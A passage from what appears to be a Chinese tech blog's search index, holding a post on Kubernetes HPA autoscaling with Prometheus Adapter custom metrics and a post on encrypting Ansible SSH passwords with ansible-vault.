定义的最下面，扩大的时候如果 cpu 到了 90%，那么一次性扩大5个pod，缩小的时候一个一个缩，这样避免带来流量的毛刺。\n二、自定义指标Prometheus 如上其实已经可以满足大多数要求了，但是想更进一步，比如想从 Prometheus 拿到的指标来进行 hpa 伸缩。\n那就比较麻烦了\n看上图，Prometheus Operator 通过 http 拉取 pod 的 metric 指标，Prometheus Adaptor 再拉取 Prometheus Operator 存储的数据并且暴露给 Custom API 使用。为啥要弄这二个东西呢？因为 Prometheus 采集到的 metrics 数据并不能直接给 k8s 用，因为两者数据格式不兼容，还需要另外一个组件(kube-state-metrics)，将prometheus 的 metrics 数据格式转换成 k8s API 接口能识别的格式，转换以后，因为是自定义API，所以还需要用 Kubernetes aggregator 在主 API 服务器中注册，以便其他程序直接通过 /apis/ 来访问。\n我们首先来看看如何安装这二个东西：\n首先装 Prometheus Operator，这家伙会自动装一捆东西， Pormetheus、Grafana、Alert manager等，所以最好给它单独弄一个命名空间\nprometheus-operator prometheus alertmanager node-exporter kube-state-metrics grafana #安装 helm install --name prometheus --namespace monitoring stable/prometheus-operator #开个端口本地访问 prometheus 的面板，curl http://localhost:9090 kubectl port-forward --namespace monitoring svc/prometheus-operator-prometheus 9090:9090 #看看都有什么pod kubectl get pod -n monitoring NAME READY STATUS RESTARTS AGE pod/alertmanager-prometheus-operator-alertmanager-0 2/2 Running 0 98m pod/prometheus-operator-grafana-857dfc5fc8-vdnff 2/2 Running 0 99m pod/prometheus-operator-kube-state-metrics-66b4c95cd9-mz8nt 1/1 Running 0 99m pod/prometheus-operator-operator-56964458-8sspk 2/2 Running 0 99m pod/prometheus-operator-prometheus-node-exporter-dcf5p 1/1 Running 0 99m pod/prometheus-operator-prometheus-node-exporter-nv6ph 1/1 Running 0 99m pod/prometheus-prometheus-operator-prometheus-0 3/3 Running 1 98m #看看都有什么svc kubectl get svc -n monitoring NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE alertmanager-operated ClusterIP None \u0026lt;none\u0026gt; 9093/TCP,9094/TCP,9094/UDP 100m prometheus-operated ClusterIP None \u0026lt;none\u0026gt; 9090/TCP 100m prometheus-operator-alertmanager NodePort 10.1.238.78 \u0026lt;none\u0026gt; 9093:31765/TCP 102m prometheus-operator-grafana NodePort 10.1.125.228 \u0026lt;none\u0026gt; 80:30284/TCP 102m prometheus-operator-kube-state-metrics ClusterIP 10.1.187.129 \u0026lt;none\u0026gt; 8080/TCP 102m prometheus-operator-operator ClusterIP 10.1.242.61 \u0026lt;none\u0026gt; 8080/TCP,443/TCP 102m prometheus-operator-prometheus NodePort 10.1.156.181 \u0026lt;none\u0026gt; 9090:30268/TCP 102m prometheus-operator-prometheus-node-exporter ClusterIP 10.1.226.134 \u0026lt;none\u0026gt; 9100/TCP 102m 我们看到有 prometheus-operated 这个ClusterIP svc，注意 k8s 的 coredns 域名解析方式，集群的内部域名是 hbb.local，那么这个 svc 的全 hostname 就是 prometheus-operated.monitoring.svc.hbb.local，集群中可以取舍到 prometheus-operated.monitoring 或者 prometheus-operated.monitoring.svc 来访问。\n然后再装 Prometheus Adaptor，我们要根据上面的具体情况来设置 prometheus.url：\nhelm install --name prometheus-adapter stable/prometheus-adapter --set prometheus.url=\u0026#34;http://prometheus-operated.monitoring.svc\u0026#34;,prometheus.port=\u0026#34;9090\u0026#34; --set image.tag=\u0026#34;v0.4.1\u0026#34; --set rbac.create=\u0026#34;true\u0026#34; --namespace custom-metrics 访问 external 和 custom 验证一下：\nkubectl get --raw \u0026#34;/apis/external.metrics.k8s.io/v1beta1\u0026#34; | jq { \u0026#34;kind\u0026#34;: \u0026#34;APIResourceList\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;groupVersion\u0026#34;: \u0026#34;external.metrics.k8s.io/v1beta1\u0026#34;, \u0026#34;resources\u0026#34;: [] } kubectl get --raw \u0026#34;/apis/custom.metrics.k8s.io/v1beta1\u0026#34; | jq { \u0026#34;kind\u0026#34;: \u0026#34;APIResourceList\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;groupVersion\u0026#34;: \u0026#34;custom.metrics.k8s.io/v1beta1\u0026#34;, \u0026#34;resources\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;*/agent.googleapis.com|agent|api_request_count\u0026#34;, \u0026#34;singularName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;namespaced\u0026#34;: true, \u0026#34;kind\u0026#34;: \u0026#34;MetricValueList\u0026#34;, \u0026#34;verbs\u0026#34;: [ \u0026#34;get\u0026#34; ] }, [...lots more metrics...] { \u0026#34;name\u0026#34;: \u0026#34;*/vpn.googleapis.com|tunnel_established\u0026#34;, \u0026#34;singularName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;namespaced\u0026#34;: true, \u0026#34;kind\u0026#34;: \u0026#34;MetricValueList\u0026#34;, \u0026#34;verbs\u0026#34;: [ \u0026#34;get\u0026#34; ] } ] } 重头戏在下面，其实 Prometheus Adaptor 从 Prometheus 拿的指标也是有限的，如果有自定义指标，或者想多拿些，就得继续拓展！！！\n最快的方式是编辑 namespace 是 custom-metrics 下的 configmap ，名字是 Prometheus-adapter，增加seriesQuery\nseriesQuery长这样子，下面是统计了所有 app=shopping-kart 的 pod 5分钟之内的变化速率总和：\napiVersion: v1 kind: ConfigMap metadata: labels: app: prometheus-adapter chart: prometheus-adapter-v1.2.0 heritage: Tiller release: prometheus-adapter name: prometheus-adapter data: config.yaml: | - seriesQuery: \u0026#39;{app=\u0026#34;shopping-kart\u0026#34;,kubernetes_namespace!=\u0026#34;\u0026#34;,kubernetes_pod_name!=\u0026#34;\u0026#34;}\u0026#39; seriesFilters: [] resources: overrides: kubernetes_namespace: resource: namespace kubernetes_pod_name: resource: pod name: matches: \u0026#34;\u0026#34; as: \u0026#34;\u0026#34; metricsQuery: sum(rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}[5m])) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;) Adapter configmap的配置如下：\nseriesQuery tells the Prometheus Metric name to the adapter（要去prometheus拿什么指标）\nresources tells which Kubernetes resources each metric is associated with or which labels does the metric include, e.g., namespace, pod etc.（关联的资源，最常用的就是 pod 和 namespace）\nmetricsQuery is the actual Prometheus query that needs to be performed to calculate the actual values.（叠加 seriesQuery 后发送给prometheus的实际查询，用于得出最终的指标值）\nname with which the metric should be exposed to the custom metrics API（暴露给API的指标名）\n举个例子：如果我们要计算 container_network_receive_packets_total，在Prometheus UI里我们要输入以下行来查询:\nsum(rate(container_network_receive_packets_total{namespace=\u0026ldquo;default\u0026rdquo;,pod=~\u0026ldquo;php-deploy.*\u0026rdquo;}[10m])) by (pod)*\n转换成 Adapter 的 metricsQuery 就变成这样了，很难懂：\n*metricsQuery: \u0026lsquo;sum(rate(\u0026laquo;.series\u0026raquo;{\u0026laquo;.labelmatchers\u0026raquo;}10m])) by (\u0026laquo;.groupby\u0026raquo;)\u0026rsquo;\u0026lt;/.groupby\u0026gt;\u0026lt;/.labelmatchers\u0026gt;\u0026lt;/.series\u0026gt;*\n再给个例子：\nrate(gorush_total_push_count{instance=\u0026#34;push.server.com:80\u0026#34;,job=\u0026#34;push-server\u0026#34;}[5m]) 变成 adapter 的 configmap\napiVersion: v1 data: config.yaml: | rules: - seriesQuery: \u0026#39;{__name__=~\u0026#34;gorush_total_push_count\u0026#34;}\u0026#39; seriesFilters: [] resources: overrides: namespace: resource: namespace pod: resource: pod name: matches: \u0026#34;\u0026#34; as: \u0026#34;gorush_push_per_second\u0026#34; metricsQuery: rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}[5m]) 修改了configmap，必须重启prometheus-adapter的pod重新加载配置！！！\n在hpa中应用的例子：\napiVersion: autoscaling/v2beta1 kind: HorizontalPodAutoscaler metadata: name: gorush-hpa spec: scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: gorush minReplicas: 1 maxReplicas: 5 metrics: - type: Pods pods: metricName: gorush_push_per_second targetAverageValue: 1m 再来一个，prometheus 函数名是 myapp_client_connected：\napiVersion: v1 data: config.yaml: | rules: - seriesQuery: \u0026#39;{__name__= \u0026#34;myapp_client_connected\u0026#34;}\u0026#39; seriesFilters: [] resources: overrides: k8s_namespace: resource: namespace k8s_pod_name: resource: pod name: matches: \u0026#34;myapp_client_connected\u0026#34; as: \u0026#34;\u0026#34; metricsQuery: \u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;,container_name!=\u0026#34;POD\u0026#34;} hpa的使用\napiVersion: autoscaling/v2beta1 kind: HorizontalPodAutoscaler metadata: name: hpa-sim namespace: default spec: scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: hpa-sim minReplicas: 1 maxReplicas: 10 metrics: - type: Pods pods: metricName: myapp_client_connected targetAverageValue: 20 很复杂吧。我们下面给个详细例子\n三、自定义指标全套例子 我们先定义一个 deployment，运行一个 nginx-vts 的 pod，这个镜像其实已经自己暴露出了 metric 指标\napiVersion: apps/v1 kind: Deployment metadata: name: nginx-deploy annotations: prometheus.io/scrape: \u0026#34;true\u0026#34; prometheus.io/port: \u0026#34;80\u0026#34; prometheus.io/path: \u0026#34;/status/format/prometheus\u0026#34; spec: selector: matchLabels: app: nginx-deploy template: metadata: labels: app: nginx-deploy spec: containers: - name: nginx-deploy image: cnych/nginx-vts:v1.0 resources: limits: cpu: 50m requests: cpu: 50m ports: - containerPort: 80 name: http 然后定义个 svc，把80端口暴露出去\napiVersion: v1 kind: Service metadata: name: nginx-svc spec: ports: - port: 80 targetPort: 80 name: http selector: app: nginx-deploy type: ClusterIP prometheus 是自动发现的，所以 annotations 就会触发 prometheus 自动开始收集这些 nginx metric指标\n集群内起个shell，访问看看\n$ curl nginx-svc.default.svc.hbb.local/status/format/prometheus # HELP nginx_vts_info Nginx info # TYPE nginx_vts_info gauge nginx_vts_info{hostname=\u0026#34;nginx-deployment-65d8df7488-c578v\u0026#34;,version=\u0026#34;1.13.12\u0026#34;} 1 # HELP nginx_vts_start_time_seconds Nginx start time # TYPE nginx_vts_start_time_seconds gauge nginx_vts_start_time_seconds 1574283147.043 # HELP nginx_vts_main_connections Nginx connections # TYPE nginx_vts_main_connections gauge nginx_vts_main_connections{status=\u0026#34;accepted\u0026#34;} 215 nginx_vts_main_connections{status=\u0026#34;active\u0026#34;} 4 nginx_vts_main_connections{status=\u0026#34;handled\u0026#34;} 215 nginx_vts_main_connections{status=\u0026#34;reading\u0026#34;} 0 nginx_vts_main_connections{status=\u0026#34;requests\u0026#34;} 15577 nginx_vts_main_connections{status=\u0026#34;waiting\u0026#34;} 3 nginx_vts_main_connections{status=\u0026#34;writing\u0026#34;} 1 # HELP nginx_vts_main_shm_usage_bytes Shared memory [ngx_http_vhost_traffic_status] info # TYPE nginx_vts_main_shm_usage_bytes gauge nginx_vts_main_shm_usage_bytes{shared=\u0026#34;max_size\u0026#34;} 1048575 nginx_vts_main_shm_usage_bytes{shared=\u0026#34;used_size\u0026#34;} 3510 nginx_vts_main_shm_usage_bytes{shared=\u0026#34;used_node\u0026#34;} 1 # HELP nginx_vts_server_bytes_total The request/response bytes # TYPE nginx_vts_server_bytes_total counter # HELP nginx_vts_server_requests_total The requests counter # TYPE nginx_vts_server_requests_total counter # HELP nginx_vts_server_request_seconds_total The request processing time in seconds # TYPE nginx_vts_server_request_seconds_total counter # HELP nginx_vts_server_request_seconds The average of request processing times in seconds # TYPE nginx_vts_server_request_seconds gauge # HELP nginx_vts_server_request_duration_seconds The histogram of request processing time # TYPE nginx_vts_server_request_duration_seconds histogram # HELP nginx_vts_server_cache_total The requests cache counter # TYPE nginx_vts_server_cache_total counter nginx_vts_server_bytes_total{host=\u0026#34;_\u0026#34;,direction=\u0026#34;in\u0026#34;} 3303449 nginx_vts_server_bytes_total{host=\u0026#34;_\u0026#34;,direction=\u0026#34;out\u0026#34;} 61641572 nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;1xx\u0026#34;} 0 nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;2xx\u0026#34;} 15574 nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;3xx\u0026#34;} 0 nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;4xx\u0026#34;} 2 nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;5xx\u0026#34;} 0 nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;total\u0026#34;} 15576 nginx_vts_server_request_seconds_total{host=\u0026#34;_\u0026#34;} 0.000 nginx_vts_server_request_seconds{host=\u0026#34;_\u0026#34;} 0.000 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;miss\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;bypass\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;expired\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;stale\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;updating\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;revalidated\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;hit\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;_\u0026#34;,status=\u0026#34;scarce\u0026#34;} 0 nginx_vts_server_bytes_total{host=\u0026#34;*\u0026#34;,direction=\u0026#34;in\u0026#34;} 3303449 nginx_vts_server_bytes_total{host=\u0026#34;*\u0026#34;,direction=\u0026#34;out\u0026#34;} 61641572 nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;1xx\u0026#34;} 0 nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;2xx\u0026#34;} 15574 nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;3xx\u0026#34;} 0 nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;4xx\u0026#34;} 2 nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;5xx\u0026#34;} 0 nginx_vts_server_requests_total{host=\u0026#34;*\u0026#34;,code=\u0026#34;total\u0026#34;} 15576 nginx_vts_server_request_seconds_total{host=\u0026#34;*\u0026#34;} 0.000 nginx_vts_server_request_seconds{host=\u0026#34;*\u0026#34;} 0.000 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;miss\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;bypass\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;expired\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;stale\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;updating\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;revalidated\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;hit\u0026#34;} 0 nginx_vts_server_cache_total{host=\u0026#34;*\u0026#34;,status=\u0026#34;scarce\u0026#34;} 0 然后用 wrk 随机发狂发请求压一把，我们去 prometheus 的面板看看指标被收集到没有\n很疯狂啊。我们编辑 Prometheus-Adapter 的 configmap ，加上如下内容\nrules: - seriesQuery: \u0026#39;nginx_vts_server_requests_total\u0026#39; seriesFilters: [] resources: overrides: kubernetes_namespace: resource: namespace kubernetes_pod_name: resource: pod name: matches: \u0026#34;^(.*)_total\u0026#34; as: \u0026#34;${1}_per_second\u0026#34; metricsQuery: (sum(rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}[1m])) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;)) 然后杀了 Prometheus-Adapter 的 Pod 让它重启重新加载配置，过段时间访问一下，看看值，是527m\nkubectl get --raw \u0026#34;/apis/custom.metrics.k8s.io/v1beta1/namespaces/default/pods/*/nginx_vts_server_requests_per_second\u0026#34; | jq . { \u0026#34;kind\u0026#34;: \u0026#34;MetricValueList\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;custom.metrics.k8s.io/v1beta1\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;selfLink\u0026#34;: \u0026#34;/apis/custom.metrics.k8s.io/v1beta1/namespaces/default/pods/%2A/nginx_vts_server_requests_per_second\u0026#34; }, \u0026#34;items\u0026#34;: [ { \u0026#34;describedObject\u0026#34;: { \u0026#34;kind\u0026#34;: \u0026#34;Pod\u0026#34;, \u0026#34;namespace\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;hpa-prom-demo-755bb56f85-lvksr\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;/v1\u0026#34; }, \u0026#34;metricName\u0026#34;: \u0026#34;nginx_vts_server_requests_per_second\u0026#34;, \u0026#34;timestamp\u0026#34;: \u0026#34;2020-04-07T09:45:45Z\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;527m\u0026#34;, \u0026#34;selector\u0026#34;: null } ] } ok，没问题，我们定义个hpa，根据这个指标来伸缩\napiVersion: autoscaling/v2beta1 kind: HorizontalPodAutoscaler metadata: name: nginx-hpa spec: scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: nginx-deploy minReplicas: 2 maxReplicas: 5 metrics: - type: Pods pods: metricName: nginx_vts_server_requests_per_second targetAverageValue: 10 这样就好了。\n如果 pod 本身不能暴露 metric ，我们可以在 sidecar 里安装 exporter 来收集数据并暴露出去就可以了。\n","permalink":"https://rendoumi.com/posts/20211125-kubernetes_hpa/","summary":"\u003cp\u003ekubernetes 的动态伸缩 HPA 是非常有用的特性。\u003c/p\u003e\n\u003cp\u003e我们的服务器托管在阿里云的 ACK 上，k8s 根据 cpu 或者 内存的使用情况，会自动伸缩关键 pod 的数量，以应对大流量的情形。而且更妙的是，动态扩展的 pod 并不是使用自己的固定服务器，而是使用阿里动态的 ECI 虚拟节点服务器，这样就真的是即开即用，用完即毁。有多大流量付多少钱，物尽其用。\u003c/p\u003e\n\u003cp\u003e我们先明确一下概念：\u003c/p\u003e\n\u003cp\u003ek8s 的资源指标获取是通过 api 接口来获得的，有两种 api，一种是核心指标，一种是自定义指标。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e核心指标：Core metrics，由metrics-server提供API，即 metrics.k8s.io，仅提供Node和Pod的CPU和内存使用情况。api 是 \u003ccode\u003emetrics.k8s.io\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e自定义指标：Custom Metrics，由Prometheus Adapter提供API，即 custom.metrics.k8s.io，由此可支持任意Prometheus采集到的自定义指标。api 是 \u003ccode\u003ecustom.metrics.k8s.io\u003c/code\u003e 和 \u003ccode\u003eexternal.metrics.k8s.io\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"一核心指标metrics-server\"\u003e一、核心指标metrics-server\u003c/h2\u003e\n\u003cp\u003e阿里的 ACK 缺省是装了 metrics-server 的，看一下，系统里有一个metrics-server\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl get pods -n kube-system\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20211125092117637\" loading=\"lazy\" src=\"/posts/20211125-kubernetes_hpa/image-20211125092117637.png\"\u003e\u003c/p\u003e\n\u003cp\u003e再看看 api 的核心指标能拿到什么，先看 Node 的指标：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl get --raw \u003cspan class=\"s2\"\u003e\u0026#34;/apis/metrics.k8s.io\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl get --raw \u003cspan class=\"s2\"\u003e\u0026#34;/apis/metrics.k8s.io/v1beta1\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq .\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekubectl get --raw \u003cspan class=\"s2\"\u003e\u0026#34;/apis/metrics.k8s.io/v1beta1/nodes\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e jq . \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20211125092534308\" loading=\"lazy\" src=\"/posts/20211125-kubernetes_hpa/image-20211125092534308.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以看到阿里 eci 虚拟节点的 cpu 和 memory 资源。\u003c/p\u003e","title":"kubernetes的hpa和自定义指标hpa"},{"content":"公司已经由 saltstack 全面转向了 ansible 。\n用 ansible-playbook 执行各种任务的时候，需要登录主机，就必然涉及到主机 ssh 密码的输入。\n最早我们是在 inventory 里做了定义：\n[deqin:vars] ansible_ssh_common_args=\u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34; host_key_checking=False ansible_ssh_user=\u0026#34;peadmin\u0026#34; ansible_ssh_pass=\u0026#34;Fuck2021!\u0026#34; [deqin] 192.168.1.19 太直白了，所有看到这文件内容的人都会知道密码了。完全没有安全性，这样行不通啊！\n好在 ansible-vault 提供了一种方法来解决：那就是生成一个密文放进去，然后解开它必须再输入一个密码。这样看到的人也不知道实际的密码到底是什么\n具体的做法如下，首先生成 key \u0026ndash;\u0026gt; 加密字符串的键值对：\nansible-vault encrypt_string \u0026#39;Fuck2021!\u0026#39; --name \u0026#39;ansible_ssh_pass\u0026#39; 输入密码，会得到下面一串字符\nansible_ssh_pass: !vault | $ANSIBLE_VAULT;1.1;AES256 37393235646234613332646366306233346330656666623862313339313861393239646261366237 6663343263363161643634653266343466356634656539650a393834663938636165336431656433 66333761643538623434363334316661653035313166333137373562363436613636366162353239 3661623733323933350a373164626131646235616361356638653733646534616163393362373135 6139 这个就是密文了，必须用输入的密码才能解开。\n注意：这里的键值 name 不可改变，如果你想把字符串拷贝下来，改掉 ansible_ssh_pass 的名字，改成别的，想改名引用，是不行的。\n这一大长串密文有以下两种用法：\n一、ini格式的inventory引用 最原始的 inventory.ini 内容如下：\n[deqin:vars] ansible_ssh_common_args=\u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34; host_key_checking=False ansible_ssh_user=\u0026#34;peadmin\u0026#34; [deqin] 192.168.1.19 我们定义 playbook 文件 shenji.yml：\n- hosts: deqin become: yes vars_files: - pass.yml vars: ansible_ssh_pass: \u0026#39;{{ ansible_ssh_pass }}\u0026#39; tasks: - name: mkdirs file: path=\u0026#34;{{ item }}\u0026#34; state=directory with_items: - \u0026#34;OS.05\u0026#34; - \u0026#34;OS.06\u0026#34; 把密文放进 pass.yml 文件\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; pass.yml ansible_ssh_pass: !vault | $ANSIBLE_VAULT;1.1;AES256 37393235646234613332646366306233346330656666623862313339313861393239646261366237 6663343263363161643634653266343466356634656539650a393834663938636165336431656433 66333761643538623434363334316661653035313166333137373562363436613636366162353239 3661623733323933350a373164626131646235616361356638653733646534616163393362373135 6139 EOF 运行 playbook：\nansible-playbook --ask-vault-pass -i inventory.ini shenji.yml -vvv 为什么这样呢？因为 ansible-vault 加密过的字符串是 yaml 格式的，在 ini 里无法直接引用。\n所以在 playbook 的 yaml 文件中引入它，然后再跟从 inventory.ini 中获取的变量合作一起。\n二、yaml格式的inventory引用 上面我们看到了必须间接引用才可以，为了避免掉 pass.yml 文件，那么干脆把 inventroy 用 yaml 格式来写，那不就可以了么\n如下即可：\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; inventory.yml --- all: hosts: deqin: ansible_host: 192.168.1.19 vars: host_key_checking: \u0026#34;False\u0026#34; ansible_ssh_common_args: \u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34; ansible_ssh_pass: !vault | $ANSIBLE_VAULT;1.1;AES256 37393235646234613332646366306233346330656666623862313339313861393239646261366237 6663343263363161643634653266343466356634656539650a393834663938636165336431656433 66333761643538623434363334316661653035313166333137373562363436613636366162353239 3661623733323933350a373164626131646235616361356638653733646534616163393362373135 6139 EOF 然后运行就可以了：\nansible-playbook --ask-vault-pass -i inventory.yml shenji.yml -vvv ","permalink":"https://rendoumi.com/posts/20211124-ansible_vault/","summary":"\u003cp\u003e公司已经由 saltstack 全面转向了 ansible 。\u003c/p\u003e\n\u003cp\u003e用 ansible-playbook 执行各种任务的时候，需要登录主机，就必然涉及到主机 ssh 密码的输入。\u003c/p\u003e\n\u003cp\u003e最早我们是在 inventory 里做了定义：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[deqin:vars]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eansible_ssh_common_args\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ehost_key_checking\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eansible_ssh_user\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;peadmin\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eansible_ssh_pass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Fuck2021!\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[deqin]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e192.168.1.19\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e太直白了，所有看到这文件内容的人都会知道密码了。完全没有安全性，这样行不通啊！\u003c/p\u003e\n\u003cp\u003e好在 ansible-vault 提供了一种方法来解决：那就是生成一个密文放进去，然后解开它必须再输入一个密码。这样看到的人也不知道实际的密码到底是什么\u003c/p\u003e\n\u003cp\u003e具体的做法如下，首先生成 key \u0026ndash;\u0026gt; 加密字符串的键值对：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eansible-vault encrypt_string \u003cspan class=\"s1\"\u003e\u0026#39;Fuck2021!\u0026#39;\u003c/span\u003e --name \u003cspan class=\"s1\"\u003e\u0026#39;ansible_ssh_pass\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e输入密码，会得到下面一串字符\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eansible_ssh_pass: !vault |\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          \u003cspan 